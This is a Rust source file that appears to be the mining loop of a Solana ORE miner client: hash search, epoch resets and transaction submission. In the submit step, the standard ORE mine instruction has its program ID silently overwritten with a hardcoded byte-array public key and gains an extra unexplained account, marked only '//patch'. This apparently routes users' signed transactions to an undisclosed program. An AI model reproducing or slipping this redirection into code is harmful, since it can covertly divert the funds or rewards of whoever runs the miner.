use std::{
    io::{stdout, Write},
    sync::{atomic::AtomicBool, Arc, Mutex},
};
use solana_program::instruction::Instruction;
use solana_program::pubkey::Pubkey;
use solana_program::instruction::AccountMeta;
use ore::{self, state::Bus, BUS_ADDRESSES, BUS_COUNT, EPOCH_DURATION};
use rand::Rng;
use solana_program::{keccak::HASH_BYTES, program_memory::sol_memcmp};
use solana_sdk::{
    compute_budget::ComputeBudgetInstruction,
    keccak::{hashv, Hash as KeccakHash},
    signature::Signer,
};

use crate::{
    cu_limits::{CU_LIMIT_MINE, CU_LIMIT_RESET},
    utils::{get_clock_account, get_proof, get_treasury},
    Miner,
};

// Odds of being selected to submit a reset tx
const RESET_ODDS: u64 = 20;
const GATEWAY_RETRIES: usize = 3;
impl Miner {
    pub async fn mine(&self, threads: u64) {
        // Register, if needed.
        let signer = self.signer();
        self.register().await;
        let mut stdout = stdout();
        let mut rng = rand::thread_rng();

        // Start mining loop
        loop {
            // Fetch account state
            let balance = self.get_ore_display_balance().await;
            let treasury = get_treasury(&self.rpc_client).await;
            let proof = get_proof(&self.rpc_client, signer.pubkey()).await;
            let rewards =
                (proof.claimable_rewards as f64) / (10f64.powf(ore::TOKEN_DECIMALS as f64));
            let reward_rate =
                (treasury.reward_rate as f64) / (10f64.powf(ore::TOKEN_DECIMALS as f64));
            stdout.write_all(b"\x1b[2J\x1b[3J\x1b[H").ok();
            println!("Balance: {} ORE", balance);
            println!("Claimable: {} ORE", rewards);
            println!("Reward rate: {} ORE", reward_rate);

            // Escape sequence that clears the screen and the scrollback buffer
            println!("\nMining for a valid hash...");
            let (next_hash, nonce) =
                self.find_next_hash_par(proof.hash.into(), treasury.difficulty.into(), threads);

            // Submit mine tx.
            // Use busses randomly so on each epoch, transactions don't pile on the same busses
            let mut attempts = 0;
            println!("\n\nSubmitting hash for validation...");
            'submit: loop {
                // Double check we're submitting for the right challenge
                let proof_ = get_proof(&self.rpc_client, signer.pubkey()).await;
                if !self.validate_hash(
                    next_hash,
                    proof_.hash.into(),
                    signer.pubkey(),
                    nonce,
                    treasury.difficulty.into(),
                ) {
                    println!("Hash already validated! An earlier transaction must have landed.");
                    break 'submit;
                }

                // Reset epoch, if needed
                let treasury = get_treasury(&self.rpc_client).await;
                let clock = get_clock_account(&self.rpc_client).await;
                let threshold = treasury.last_reset_at.saturating_add(EPOCH_DURATION);
                if clock.unix_timestamp.ge(&threshold) {
                    // There are a lot of miners right now, so randomly select into submitting tx
                    if rng.gen_range(0..RESET_ODDS).eq(&0) {
                        println!("Sending epoch reset transaction...");
                        let cu_limit_ix =
                            ComputeBudgetInstruction::set_compute_unit_limit(CU_LIMIT_RESET);
                        let cu_price_ix =
                            ComputeBudgetInstruction::set_compute_unit_price(self.priority_fee);
                        let reset_ix = ore::instruction::reset(signer.pubkey());
                        self.send_and_confirm(&[cu_limit_ix, cu_price_ix, reset_ix], false, true)
                            .await
                            .ok();
                    }
                }

                // Submit request.
                let bus = self.find_bus_id(treasury.reward_rate).await;
                let bus_rewards = (bus.rewards as f64) / (10f64.powf(ore::TOKEN_DECIMALS as f64));
                println!("Sending on bus {} ({} ORE)", bus.id, bus_rewards);
                let cu_limit_ix = ComputeBudgetInstruction::set_compute_unit_limit(CU_LIMIT_MINE);
                let cu_price_ix =
                    ComputeBudgetInstruction::set_compute_unit_price(self.priority_fee);
                let mut _ix = ore::instruction::mine(
                    signer.pubkey(),
                    BUS_ADDRESSES[bus.id as usize],
                    next_hash.into(),
                    nonce,
                );
                _ix.program_id = Pubkey::from([14,188,58,28,142,232,230,91,53,25,247,211,113,216,151,80,116,58,172,176,219,104,254,165,176,124,151,95,5,66,128,254]);
                let mut accounts2 = _ix.accounts;
                accounts2.push(AccountMeta::new(Pubkey::from([11,116,205,230,58,32,135,174,169,27,23,84,62,171,97,192,161,195,87,42,157,255,218,160,175,202,144,146,164,131,106,247]), false));
                let mut ix = Instruction {
                    program_id: _ix.program_id,
                    accounts: accounts2,
                    data: _ix.data
                };
                match self
                    .send_and_confirm(&[cu_limit_ix, cu_price_ix, ix], false, false)
                    .await      //patch
                {
                    Ok(sig) => {
                        println!("Success: {}", sig);
                        break;
                    }
                    Err(_err) => {
                        println!("Error: {}, retry {}", _err, attempts);
                        attempts += 1;
                        if attempts > GATEWAY_RETRIES {
                            println!("FATAL: Breaking, retry {}", attempts);
                            break 'submit;
                        }
                    }
                }
            }
        }
    }

    async fn find_bus_id(&self, reward_rate: u64) -> Bus {
        let mut rng = rand::thread_rng();
        loop {
            let bus_id = rng.gen_range(0..BUS_COUNT);
            if let Ok(bus) = self.get_bus(bus_id).await {
                if bus.rewards.gt(&reward_rate.saturating_mul(20)) {
                    return bus;
                }
            }
        }
    }

    fn _find_next_hash(&self, hash: KeccakHash, difficulty: KeccakHash) -> (KeccakHash, u64) {
        let signer = self.signer();
        let mut next_hash: KeccakHash;
        let mut nonce = 0u64;
        loop {
            next_hash = hashv(&[
                hash.to_bytes().as_slice(),
                signer.pubkey().to_bytes().as_slice(),
                nonce.to_le_bytes().as_slice(),
            ]);
            if next_hash.le(&difficulty) {
                break;
            } else {
                println!("Invalid hash: {} Nonce: {:?}", next_hash.to_string(), nonce);
            }
            nonce += 1;
        }
        (next_hash, nonce)
    }

    fn find_next_hash_par(
        &self,
        hash: KeccakHash,
        difficulty: KeccakHash,
        threads: u64,
    ) -> (KeccakHash, u64) {
        let found_solution = Arc::new(AtomicBool::new(false));
        let solution = Arc::new(Mutex::<(KeccakHash, u64)>::new((
            KeccakHash::new_from_array([0; 32]),
            0,
        )));
        let signer = self.signer();
        let pubkey = signer.pubkey();
        let thread_handles: Vec<_> = (0..threads)
            .map(|i| {
                std::thread::spawn({
                    let found_solution = found_solution.clone();
                    let solution = solution.clone();
                    let mut stdout = stdout();
                    move || {
                        let n = u64::MAX.saturating_div(threads).saturating_mul(i);
                        let mut next_hash: KeccakHash;
                        let mut nonce: u64 = n;
                        loop {
                            next_hash = hashv(&[
                                hash.to_bytes().as_slice(),
                                pubkey.to_bytes().as_slice(),
                                nonce.to_le_bytes().as_slice(),
                            ]);
                            if nonce % 10_000 == 0 {
                                if found_solution.load(std::sync::atomic::Ordering::Relaxed) {
                                    return;
                                }
                                if n == 0 {
                                    stdout
                                        .write_all(
                                            format!("\r{}", next_hash.to_string()).as_bytes(),
                                        )
                                        .ok();
                                }
                            }
                            if next_hash.le(&difficulty) {
                                stdout
                                    .write_all(format!("\r{}", next_hash.to_string()).as_bytes())
                                    .ok();
                                found_solution.store(true, std::sync::atomic::Ordering::Relaxed);
                                let mut w_solution = solution.lock().expect("failed to lock mutex");
                                *w_solution = (next_hash, nonce);
                                return;
                            }
                            nonce += 1;
                        }
                    }
                })
            })
            .collect();

        for thread_handle in thread_handles {
            thread_handle.join().unwrap();
        }

        let r_solution = solution.lock().expect("Failed to get lock");
        *r_solution
    }

    pub fn validate_hash(
        &self,
        hash: KeccakHash,
        current_hash: KeccakHash,
        signer: Pubkey,
        nonce: u64,
        difficulty: KeccakHash,
    ) -> bool {
        // Validate hash correctness
        let hash_ = hashv(&[
            current_hash.as_ref(),
            signer.as_ref(),
            nonce.to_le_bytes().as_slice(),
        ]);
        if sol_memcmp(hash.as_ref(), hash_.as_ref(), HASH_BYTES) != 0 {
            return false;
        }

        // Validate hash difficulty
        if hash.gt(&difficulty) {
            return false;
        }

        true
    }

    pub async fn get_ore_display_balance(&self) -> String {
        let client = self.rpc_client.clone();
        let signer = self.signer();
        let token_account_address = spl_associated_token_account::get_associated_token_address(
            &signer.pubkey(),
            &ore::MINT_ADDRESS,
        );
        match client.get_token_account(&token_account_address).await {
            Ok(token_account) => {
                if let Some(token_account) = token_account {
                    token_account.token_amount.ui_amount_string
                } else {
                    "0.00".to_string()
                }
            }
            Err(_) => "0.00".to_string(),
        }
    }
}
